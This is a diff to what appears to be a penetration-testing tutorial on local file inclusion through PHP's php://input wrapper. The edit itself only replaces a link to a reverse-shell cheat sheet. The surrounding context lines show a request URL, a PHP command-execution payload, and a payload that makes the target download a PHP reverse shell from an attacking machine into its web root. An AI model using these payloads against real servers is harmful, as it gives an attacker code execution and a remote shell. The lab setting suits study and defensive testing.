@@ -66,7 +66,7 @@ http://192.168.183.128/fileincl/example1.php?page=php://input
 
 Post Data payload, try something simple to start with like: <code><? system('uname -a');?></code>
 
-Then try and download a [reverse shell](https://highon.coffee/blog/reverse-shell-cheat-sheet/) from your attacking machine using:
+Then try and download a [reverse shell](https://hacksofdhruv.me/blog/reverse-shell-cheat-sheet/) from your attacking machine using:
 
 {% highlight bash %}
 <? system('wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php');?>
